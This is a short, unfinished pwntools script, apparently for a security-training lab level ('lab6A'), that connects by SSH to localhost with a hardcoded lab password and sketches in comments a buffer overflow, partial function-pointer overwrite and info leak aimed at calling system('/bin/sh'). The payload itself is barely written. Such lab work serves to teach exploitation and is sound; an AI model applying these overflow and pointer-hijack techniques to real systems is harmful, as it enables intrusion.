from pwn import *
s = ssh(host='127.0.0.1', user='lab6A', password='strncpy_1s_n0t_s0_s4f3_l0l')
sh = s.run('bash')

exploit = b''
# 1 setup_account
#   exploit += b'1\n'+b'a'*31+b'\n'+b'a'*90+address of print_name partial overwrite
#   get info leak
#   overwrites the print_listing
#   b'\n'*4+b'3\n'
#   calls that function
# do partial over_write on setup_account again
# b'\n'*4+b'3\n' to call new function pointer
# to go to make_note() gets() overflow after 40
# redirect to system("/bin/sh")
exploit += b' | /'
sh.sendline(exploit)

# 2 make_listing 31 chars for ulisting.name
#   9 chars for ulisting.prices